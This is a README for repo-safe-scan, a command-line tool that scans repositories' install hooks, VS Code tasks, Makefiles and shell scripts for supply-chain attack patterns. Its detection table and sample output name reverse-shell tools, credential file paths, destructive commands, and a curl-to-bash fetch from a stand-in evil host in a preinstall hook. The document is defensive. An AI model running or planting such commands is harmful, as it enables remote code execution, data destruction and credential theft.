# repo-safe-scan

> **Audit `package.json` scripts, VSCode tasks, Makefiles and shell scripts for supply-chain attack patterns — before you `npm install`.**

[![Node.js >=18](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

---

## Why?

Most security tools scan your **dependencies** for known vulnerabilities (e.g. CVEs). But attackers increasingly exploit **script execution hooks** that run automatically when you clone and install a repo:

| Vector | Risk |
|--------|------|
| `preinstall` / `postinstall` in `package.json` | Executes on every `npm install` — silently |
| `.vscode/tasks.json` | Auto-runs tasks when VS Code opens the folder |
| `.vscode/settings.json` | Can hijack your integrated terminal |
| `Makefile` default targets | Executes on `make` |
| `*.sh` scripts | Called by any of the above |

`repo-safe-scan` detects these patterns **before** you run anything, protecting your machine from reverse shells, credential exfiltration, and destructive payloads.

---

## Installation

```bash
# Install globally
npm install -g repo-safe-scan

# Or use via npx (no install needed)
npx repo-safe-scan /path/to/repo
```

---

## Usage

```bash
repo-safe-scan [path] [options]
```

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `[path]` | Repository root to scan | `.` (current dir) |
| `--severity <level>` | Minimum severity to report: `medium` \| `high` \| `critical` | `medium` |
| `--include-node-modules` | Scan dependencies in `node_modules` for malicious lifecycle hooks | off |
| `--json` | Output findings as JSON (for CI pipelines) | off |
| `--no-color` | Disable colored terminal output | off |
| `--version` | Print version | |

### Examples

```bash
# Scan a locally cloned repo before installing
repo-safe-scan ./suspicious-package

# Scan including deeply nested dependencies
repo-safe-scan ./suspicious-package --include-node-modules

# Only show critical findings
repo-safe-scan ./suspicious-package --severity critical

# Machine-readable output for CI
repo-safe-scan . --json > results.json
```

---

## Features

### 1. Robust JavaScript AST Parsing
Attackers know you might be grepping for `curl` or `child_process`. They obfuscate.
`repo-safe-scan` includes a **JavaScript AST (Abstract Syntax Tree) Analyzer** powered by `acorn` that understands code structure. It tracks variable bindings (`const cp = require("child_process")`), object destructuring (`const { exec } = cp`), and dynamic concatenation (`require("child_" + "process")`) to accurately flag dangerous execution streams.

### 2. Command Normalization Engine
Before testing configured commands against security rules, commands are normalized (quotes stripped, lowercase enforced, whitespace collapsed). This neutralizes straightforward casing and spacing bypass tricks (e.g., `cUrL        eViL.cOm | bAsH`).

### 3. Smart Risk Scoring System
The scanner computes a normalized **Repository Risk Score** out of 10.0 based on a weighted algorithm:
- Critical finding = `25 pts`
- High finding = `10 pts`
- Medium finding = `4 pts`
- Auto-executed Lifecycle Hooks (`preinstall`, etc.) = `+10 pts` bonus penalty.

### 4. Dependency Lifecycle Scanning
Use the `--include-node-modules` flag to hunt for supply-chain bombs hidden deep inside dependency lifecycle scripts in `node_modules/*/package.json`.

---

## What it Detects

The engine uses a modular rule system organized by category (`src/rules/`):

| Category | Examples |
|----------|---------|
| **remote-execution** | `curl \| bash`, `wget \| sh`, `Invoke-Expression` |
| **obfuscation** | `eval()`, `new Function()`, `base64 -d`, `fromCharCode` |
| **reverse-shell** | `nc -e`, `/dev/tcp/`, `socat` |
| **credential-theft** | Access to `~/.ssh`, `~/.aws/credentials`, `.npmrc`, `.env` |
| **destructive** | `rm -rf`, `del /f /q`, `format C:` |
| **privilege-escalation** | `sudo` in npm scripts, `chmod +x` after download |
| **tls-bypass** | `curl -k`, `wget --no-check-certificate` |
| **reconnaissance** | `whoami \|`, `ifconfig \| curl` |

---

## Output

### Terminal (default)

```
  repo-safe-scan v1.1.0  🔍 Scanning: ./suspect-repo

  📄 package.json
  ────────────────────────────────────────────────────────────
  CRITICAL  LIFECYCLE  curl-pipe-shell
  Description: Downloads and pipes content directly into a shell
  Category:    remote-execution
  Script:      preinstall
  Command:     curl http://evil.example.com/payload.sh | bash

     ⚠ This script runs automatically on `npm install` — no user confirmation required. This is the primary supply-chain attack vector.

  ════════════════════════════════════════════════════════════
  SUMMARY  1 critical  0 high  0 medium  (1 auto-executed lifecycle hooks)
  Scanned path: ./suspect-repo

  ╔═════════════════════════════════════════╗
  ║  Repository Risk Score:  3.5 / 10       ║
  ║  ███████░░░░░░░░░░░░░  MODERATE         ║
  ╚═════════════════════════════════════════╝
```

---

## Development

The project is fully written in **TypeScript**.

```bash
# Clone and install
git clone https://github.com/Chetan2708/repo-safe-scan.git
cd repo-safe-scan
npm install

# Build
npm run build

# Run tests
npm test

# Run tests with coverage
npm run test:coverage

# Scan the repo itself
npm start -- .
```

### Project Structure

```
repo-safe-scan/
├── bin/
│   └── cli.ts               # CLI CLI orchestration & output rendering
├── src/
│   ├── scanner.ts           # Core orchestrator 
│   ├── scoring.ts           # Risk Score logic
│   ├── analyzers/           # Plugable analyzer registry
│   │   ├── index.ts              # Registry
│   │   ├── jsAstAnalyzer.ts      # AST JS/TS parsing (eval, cp.exec)
│   │   ├── packageAnalyzer.ts    # package.json scripts
│   │   ├── vscodeAnalyzer.ts     # .vscode/ tasks/settings
│   │   ├── makefileAnalyzer.ts   # Makefile targets
│   │   ├── shellScriptAnalyzer.ts# *.sh / *.bash 
│   │   └── nodeModulesAnalyzer.ts# --include-node-modules scanner
│   └── rules/               # Modular rule definitions
│       ├── rules.ts         # Rule aggregator
│       ├── destructive.rules.ts
│       ├── execution.rules.ts
│       ├── exfiltration.rules.ts
│       └── obfuscation.rules.ts
└── tests/
    └── fixtures/            # Test repositories
```

---

## License

MIT © 2026
